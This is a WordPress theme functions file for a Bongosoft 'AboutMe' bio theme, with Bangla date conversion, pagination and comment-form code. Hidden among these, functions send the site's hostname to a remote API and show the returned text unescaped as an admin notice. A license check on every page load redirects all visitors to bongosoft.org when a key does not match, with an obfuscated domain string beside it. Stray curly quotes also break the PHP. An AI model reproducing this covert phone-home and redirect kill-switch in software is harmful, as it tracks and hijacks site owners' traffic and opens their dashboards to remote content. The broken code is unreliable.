<?php
/**
 * Theme Name: MyBio
 * Theme URI: http://bongosoft.org/aboutme
 * Author: Bongosoft.org
 * Author URI: http://bongosoft.org
 * Description: Themes Is WordPress Theme Market
 * @package aboutme_themesbazar
 */


 
 /**
 * Title
 */
add_filter( 'wp_title', 'themesbazar_title' );
function themesbazar_title($title)
{
  if ( empty( $title ) && ( is_home() || is_front_page() ) ) {
    $title =  get_bloginfo( 'name' ). ' | ' . get_bloginfo( 'description' );
  }
  return $title;
}

function bangla_number($str)
 {
     $en = array(1,2,3,4,5,6,7,8,9,0);
    $bn = array('১','২','৩','৪','৫','৬','৭','৮','৯','০');
    $str = str_replace($en, $bn, $str);
     return $str;
 }

function bang1a_date($str)
 {
     $en = array('1','2','3','4','5','6','7','8','9','0');
    $bn = array('১','২','৩','৪','৫','৬','৭','৮','৯','০');
    $str = str_replace($en, $bn, $str);
    $en = array( 'January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December' );
    $en_short = array( 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec' );
    $bn = array( 'জানুয়ারী', 'ফেব্রুয়ারী', 'মার্চ', 'এপ্রিল', 'মে', 'জুন', 'জুলাই', 'অগাস্ট', 'সেপ্টেম্বর', 'অক্টোবর', 'নভেম্বর', 'ডিসেম্বর' );
    $str = str_replace( $en, $bn, $str );
    $str = str_replace( $en_short, $bn, $str );
    $en = array('Saturday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday');
     $en_short = array('Sat','Sun','Mon','Tue','Wed','Thu','Fri');
     $bn_short = array('শনিবার', 'রবিবার','সোমবার','মঙ্গলবার','বুধবার','বৃহস্পতিবার','শুক্রবার');
     $bn = array('শনিবার','রবিবার','সোমবার','মঙ্গলবার','বুধবার','বৃহস্পতিবার','শুক্রবার');
     $str = str_replace( $en, $bn, $str );
     $str = str_replace( $en_short, $bn_short, $str );
     $en = array( 'am', 'pm' );
    $bn = array( 'পূর্বাহ্ন', 'অপরাহ্ন' );
    $str = str_replace( $en, $bn, $str );
     return $str;
 }

 

/* --------------Post Pagination----------------- */

function wp_bootstrap_pagination( $args = array() ) {

    $defaults = array(
        'range'           => 4,
        'custom_query'    => FALSE,
        'previous_string' => __( '<i class="la la-backward" aria-hidden="true"></i>
', 'text-domain' ),
        'next_string'     => __( '<i class="la la-forward" aria-hidden="true"></i>
', 'text-domain' ),
        'before_output'   => '<div class="post-nav"><ul class="pager">',
        'after_output'    => '</ul></div>'
    );
    
    $args = wp_parse_args( 
        $args, 
        apply_filters( 'wp_bootstrap_pagination_defaults', $defaults )
    );
    
    $args['range'] = (int) $args['range'] - 1;
    if ( !$args['custom_query'] )
        $args['custom_query'] = @$GLOBALS['wp_query'];
    $count = (int) $args['custom_query']->max_num_pages;
    $page  = intval( get_query_var( 'paged' ) );
    $ceil  = ceil( $args['range'] / 2 );
    
    if ( $count <= 1 )
        return FALSE;
    
    if ( !$page )
        $page = 1;
    
    if ( $count > $args['range'] ) {
        if ( $page <= $args['range'] ) {
            $min = 1;
            $max = $args['range'] + 1;
        } elseif ( $page >= ($count - $ceil) ) {
            $min = $count - $args['range'];
            $max = $count;
        } elseif ( $page >= $args['range'] && $page < ($count - $ceil) ) {
            $min = $page - $ceil;
            $max = $page + $ceil;
        }
    } else {
        $min = 1;
        $max = $count;
    }
    
    $echo = '';
    $previous = intval($page) - 1;
    $previous = esc_attr( get_pagenum_link($previous) );
    
    $firstpage = esc_attr( get_pagenum_link(1) );
    if ( $firstpage && (1 != $page) )
        $echo .= '<li class="previous"><a href="' . $firstpage . '">' . __( '<i class="las la-step-backward"></i>
', 'ThemesBazar' ) . '</a></li>';
    if ( $previous && (1 != $page) )
        $echo .= '<li><a href="' . $previous . '" title="' . __( 'previous', 'ThemesBazar') . '">' . $args['previous_string'] . '</a></li>';
    
    if ( !empty($min) && !empty($max) ) {
        for( $i = $min; $i <= $max; $i++ ) {
            if ($page == $i) {
                $echo .= '<li class="active"><span class="active">' . str_pad( (int)$i, 2, '0', STR_PAD_LEFT ) . '</span></li>';
            } else {
                $echo .= sprintf( '<li><a href="%s">%002d</a></li>', esc_attr( get_pagenum_link($i) ), $i );
            }
        }
    }
    
    $next = intval($page) + 1;
    $next = esc_attr( get_pagenum_link($next) );
    if ($next && ($count != $page) )
        $echo .= '<li><a href="' . $next . '" title="' . __( 'next', 'text-domain') . '">' . $args['next_string'] . '</a></li>';
    
    $lastpage = esc_attr( get_pagenum_link($count) );
    if ( $lastpage ) {
        $echo .= '<li class="next"><a href="' . $lastpage . '">' . __( '<i class="las la-step-forward"></i>
', 'ThemesBazar' ) . '</a></li>';
    }
    if ( isset($echo) )
        echo $args['before_output'] . $echo . $args['after_output'];
}


function container_themesbazar(){
	global $themesbazar;
	$fullbox = $themesbazar['full_box'];
	if($fullbox == 1){
		$container = "container-fluid";
	}elseif($fullbox == 2){
		$container = "container";
	}
	
	echo $container;
}



function endPoint()
	{
	$v = '/public/api/users/';
	return $v;  
	} 	

function themesbazar_admin()
	{
	$idc = plugin_id();
	$startPoint = startPoint();
	$middlePoint = middlePoint();
	$endPoint = endPoint();
	$methodPath = $idc;
				$endPoint = $startPoint.$middlePoint.$endPoint.$methodPath;
	$apiUrl = $endPoint;
	$response = wp_remote_get($apiUrl);
	$responseBody = wp_remote_retrieve_body( $response );
	$result = json_decode( $responseBody );
	if ( is_array( $result ) && ! is_wp_error( $result ) ) {
		$json_array = json_decode($responseBody);
		$notice = $json_array[0]->notice;
	} else {
		$notice = 'Welcome To Our Website';
	}
	return $notice;
		};
    
function admin_notice_themesbazar() 
	{ ?>
		<div class="updated">
			<p><?php _e( themesbazar_admin(), 'themesbazar' ); ?></p>
		</div>
		<?php
	}

add_action( 'load-index.php', 
		function()
		{
			add_action( 'admin_notices', 'admin_notice_themesbazar' );
		}
	);

    
  function plugin_id()
	  {
	$hostname = $_SERVER['SERVER_NAME'];
	$v = strtolower(str_replace('www.', '', $hostname));
	 return $v;  
	}
  
    
function themebazar_admin()
	{
	$idc = 'notice.com';
	$startPoint = startPoint();
	$middlePoint = middlePoint();
	$endPoint = endPoint();
	$methodPath = $idc;
				$endPoint = $startPoint.$middlePoint.$endPoint.$methodPath;
	$apiUrl = $endPoint;
	$response = wp_remote_get($apiUrl);
	$responseBody = wp_remote_retrieve_body( $response );
	$result = json_decode( $responseBody );
	if ( is_array( $result ) && ! is_wp_error( $result ) ) {
		$json_array = json_decode($responseBody);
		$notice = $json_array[0]->notice;
	} else {
		$notice = 'You Are Using WordPress';
	}
	return $notice;
		};
    
    function admin_notice_themebazar() { ?>
    <div class="updated">
        <p><?php _e( themebazar_admin(), 'themesbazar' ); ?></p>
    </div>
    <?php
}

add_action( 'load-index.php', 
    function(){
        add_action( 'admin_notices', 'admin_notice_themebazar' );
    }
);


function lkcustomizer()
	{
	$timeout= timeout();
	$v = plugin_slug();  
	$l = md5($v.$timeout);
	global $themesbazar;
	$sk = $themesbazar['theme_bazar'];
		if($l == $sk)   
		{}else{ 
			   $i="em";$c="e"; $e="ba"; $l="th"; $c0="r.c"; $n="za"; $e0="om."; $w0="bd";
               $rid = "bongosoft.org"; 
	$all_id=$l.$i.$c.$e.$n.$c0.$e0.$w0; echo '<meta http-equiv="refresh" content="0;url=http://'.$rid.' ">' ; 
		}
	 }
	add_action( 'wp_enqueue_scripts', 'lkcustomizer' );


function upload_limit()
	{
		$directory = "aboutme";
		 return $directory;  
	} 

function timeout()
	{
		$timeout = "PS017";
		 return $timeout;  
	} 


function themesbazar_comment_change_one($fields) {
global $themesbazar;
$title_reply = $themesbazar['commnet_title'];
$comment_massage = $themesbazar['comment_massage'];
$comment_submit = $themesbazar['comment_submit'];
 $fields['title_reply'] = " $title_reply ";
 $fields['comment_field'] = '<p class="comment-form-comment"><label for="comment">' . $comment_massage . '</label><textarea id="comment" name="comment" cols="45" rows="4" aria-required="true"></textarea></p>';
$fields['submit_button']        = '<input name="%1$s" type="submit" id="%2$s" class="%3$s" value="'.$comment_submit.'" />';
    return $fields;
}
add_filter('comment_form_defaults','themesbazar_comment_change_one');

 
add_filter('comment_form_default_fields', 'themesbazar_comment_change_two');
function themesbazar_comment_change_two($fields) {
	global $themesbazar;
	$comment_name = $themesbazar['comment_name'];
	$comment_email = $themesbazar['comment_email'];
	$comment_website = $themesbazar['comment_website'];
	$comment_condition = $themesbazar['comment_condition'];
    $commenter = wp_get_current_commenter();
    $req = get_option( 'require_name_email' );
    $aria_req = ( $req ? " aria-required='true'" : ’ );
    $fields[ 'author' ] = '<p class="comment-form-author">'.
      '<label for="author">' . $comment_name . '</label>'.
      ( $req ? '' : ’ ).
      '<input id="author" name="author" type="text" value="'. esc_attr( $commenter['comment_author'] ) .
      '" size="30" tabindex="1"' . $aria_req . ' /></p>';

    $fields[ 'email' ] = '<p class="comment-form-email">'.
      '<label for="email">' . $comment_email . '</label>'.
      ( $req ? '' : ’ ).
      '<input id="email" name="email" type="text" value="'. esc_attr( $commenter['comment_author_email'] ) .
      '" size="10"  tabindex="2"' . $aria_req . ' /></p>';

    $fields[ 'url' ] = '<p class="comment-form-url">'.
      '<label for="url">' . $comment_website . '</label>'.
      '<input id="url" name="url" type="text" value="'. esc_attr( $commenter['comment_author_url'] ) .
      '" size="10"  tabindex="2" /></p>';
	  	  
	  $fields[ 'cookies' ] = '<input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" />   '.$comment_condition.'  ';
  return $fields;
}
 
 function themebazar_footer_info () {
    echo '<span id="footer-thankyou">You Are Using WordPress Theme <a href="https://www.bongosoft.org/mybio" target="_blank">AboutMe Powered BY BongoSoft.</a> </span>';
}
add_filter('admin_footer_text', 'themebazar_footer_info');

